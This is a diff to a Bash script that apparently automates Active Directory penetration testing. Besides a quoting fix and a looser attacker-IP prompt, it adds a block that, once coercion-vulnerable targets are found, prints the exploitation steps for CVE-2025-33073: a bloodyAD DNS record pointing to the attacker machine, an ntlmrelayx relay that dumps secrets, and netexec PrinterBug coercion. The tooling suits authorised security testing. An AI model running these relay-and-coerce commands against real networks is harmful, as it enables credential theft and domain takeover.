@@ -656,7 +656,7 @@ authenticate() {
         argument_ldapper="-D ${domain} -U '${user}' -P '${password}'"
         argument_adalanche="--authmode ntlm --username '${user}'\\@${domain} --password '${password}'"
         argument_mssqlrelay="-u '${user}'\\@${domain} -p '${password}'"
-        argument_pygpoabuse="${domain}/'${user}':'${password}''"
+        argument_pygpoabuse="${domain}/'${user}':'${password}'"
         argument_GPOwned="-d ${domain} -u '${user}' -p '${password}'"
         argument_privexchange="-d ${domain} -u '${user}' -p '${password}'"
         argument_adcheck="-d ${domain} -u '${user}' -p '${password}'"
@@ -3058,6 +3058,15 @@ ms17-010_check() {
 coerceplus_check() {
     echo -e "${BLUE}[*] coerce check ${NC}"
     run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M coerce_plus --log ${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt" 2>&1
+    if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt"; then
+        echo -e "${GREEN}[+] Target(s) vulnerable to coercing found! Consider checking for CVE-2025-33073 (https://github.com/mverschu/CVE-2025-33073). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}1. Add DNS record pointing to the attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}2. Use ntlmrelayx to run a listener and execute secretdump:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "ntlmrelayx.py -t smb://[ TARGET ] -smb2support" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}3. Coerce the target machine to connect back to your attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${netexec} ${ne_verbose} smb [ TARGET ] ${argument_ne} -M coerce_plus -o M=PrinterBug L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+    fi
     echo -e ""
 }
 
@@ -4616,21 +4625,13 @@ set_attackerIP() {
         echo -e "${YELLOW}${ip}${NC}"
     done
     attacker_IP=""
-    matched=false
     read -rp ">> " attacker_IP </dev/tty
 
-    while [[ -z "${attacker_IP}" || "$matched" != true ]]; do
-        matched=false
+    while [[ -z "${attacker_IP}" ]]; do
         if [[ -z "${attacker_IP}" ]]; then
             echo -e "${RED}Empty input.${NC}"
         fi
-        for ip in "${attacker_IPlist[@]}"; do
-            if [[ "$ip" == "${attacker_IP}" ]]; then
-                matched=true
-                break
-            fi
-        done
-        if [[ "$matched" != true || -z "${attacker_IP}" ]]; then
+        if [[ -z "${attacker_IP}" ]]; then
             echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list."
             read -rp ">> " attacker_IP </dev/tty
         fi
